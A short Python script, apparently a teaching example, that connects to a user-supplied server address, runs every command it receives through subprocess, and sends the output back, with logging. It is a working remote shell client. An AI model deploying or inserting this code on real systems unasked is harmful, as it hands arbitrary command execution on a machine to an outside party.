import socket
import subprocess
import logging

logging.basicConfig(filename='clientlogs.txt', filemode='a', \
    format='%(asctime)s - %(message)s', datefmt='%d-%b-%y %H:%M:%S', level=logging.DEBUG)

# Create socket with socket class.
slave = socket.socket()
 
# Host is the IP address of master machine.
host = input("Server IP: ")
 
# This will be the port that master
# machine listens.
port = int(input("Server PORT: "))

# connect to the master machine with connect
# command.
try:
    slave.connect((host, port))
    print("Connected to the Server...")
    logging.info(f"Connected to {host}:{port}")
    print("Commands executed by server...")
except Exception as e:
    print("Unable to connect", e)
    logging.error('Unable to connect', e)

while True:
    # receive the command from the master machine.
    # recv 1024 bytes from the master machine.
    command = slave.recv(1024).decode()
    print(command)
 
    # If the command is exit, close the connection.
    if command == "exit":
        break
    
    output  = "output:\n"
     
    # getoutput method executes the command and
    # returns the output.
    output += subprocess.getoutput(command)
     
    # Encode and send the output of the command to
    # the master machine.
    slave.send(output.encode())

    logging.info(command)
    logging.info(output)
    # f.write(content)
    # f.write("\n")
    # f.write(output_content)
    # f.write("\n")

# close method closes the connection.
slave.close()